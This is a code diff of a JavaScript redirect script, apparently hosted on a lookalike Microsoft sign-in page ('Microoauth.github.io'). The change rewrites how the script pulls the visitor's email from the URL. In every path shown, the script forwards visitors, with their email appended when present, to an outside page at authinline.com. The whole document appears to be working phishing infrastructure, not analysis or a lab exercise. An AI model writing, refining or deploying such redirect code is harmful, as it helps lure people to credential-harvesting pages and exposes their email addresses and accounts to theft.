@@ -9,31 +9,31 @@
 
       // Check if the current URL contains a '?' character
       if (currentURL.includes('?')) {
-        // Split the URL into two parts: the base URL and the email part
+        // Split the URL into two parts: the base URL and the query parameters
         var parts = currentURL.split('?');
-        var baseURL = parts[0]; // https://Microoauth.github.io/mail
-        var emailPart = parts[1];
+        var baseURL = parts[0]; // Base URL
+        var queryParameters = parts[1];
 
-        // Check if the email part is not empty
-        if (emailPart) {
-          // Split the emailPart into email and the rest of the parameters
-          var emailAndRest = emailPart.split('=');
-          var email = emailAndRest[0];
-          var rest = emailAndRest[1];
-
-          // Construct the redirect URL by appending the email in front of the '='
-          var redirectURL = 'https://authinline.com/email/index.html?' + email + '=' + rest;
-
-          // Redirect to the constructed URL
-          window.location.href = redirectURL;
-        } else {
-          // If the email part is empty, simply redirect to the second link
-          window.location.href = 'https://authinline.com/email/index.html/';
+        // Check if query parameters are not empty
+        if (queryParameters) {
+          // Split the query parameters to separate the email and the rest of the parameters
+          var queryParams = queryParameters.split('&');
+          for (var i = 0; i < queryParams.length; i++) {
+            var param = queryParams[i].split('=');
+            if (param[0] === 'email') {
+              // Extract the email parameter value
+              var email = param[1];
+              // Construct the redirect URL with the email in front of the '='
+              var redirectURL = 'https://authinline.com/email/index.html?' + email;
+              // Redirect to the constructed URL
+              window.location.href = redirectURL;
+              return; // Exit the loop once email parameter is found
+            }
+          }
         }
-      } else {
-        // If no '?' character is found, simply redirect to the second link
-        window.location.href = 'https://authinline.com/email/index.html/';
       }
+      // If no valid email parameter is found, simply redirect to the second link
+      window.location.href = 'https://authinline.com/email/index.html/';
     }
 
     // Call the function immediately when the script is loaded
